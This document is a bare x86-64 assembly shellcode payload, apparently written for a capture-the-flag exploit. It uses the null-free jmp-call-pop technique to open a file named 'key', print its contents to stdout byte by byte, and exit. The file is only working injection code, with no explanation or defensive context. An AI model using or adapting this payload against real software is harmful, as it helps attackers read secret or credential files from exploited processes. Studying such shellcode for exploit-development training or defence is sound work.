BITS 64
	GLOBAL _start

_start:
    jmp short FILENAME
RET:

	;; sys_open(filename, 0, 0)
    xor rax, rax
	mov al, 2
	pop rdi
	xor rsi, rsi
    xor rdx, rdx
	syscall

    xchg rax, r12

    .LOOP:
    ;; sys_read(fd, rsp, 0x1234)
    mov rdi, r12
    xor rax, rax
    xor rdx, rdx
    inc edx
    mov rsi, rsp
    syscall

    test rax, rax
    jz .END

    ;; sys_write(fd, rsp, rax)

    xor rdi, rdi
    inc rdi
    syscall

    jmp short .LOOP
    .END:

    xor rax,rax
    mov al, 60
    syscall

FILENAME:

    call RET
filename: db 'key', 0x00
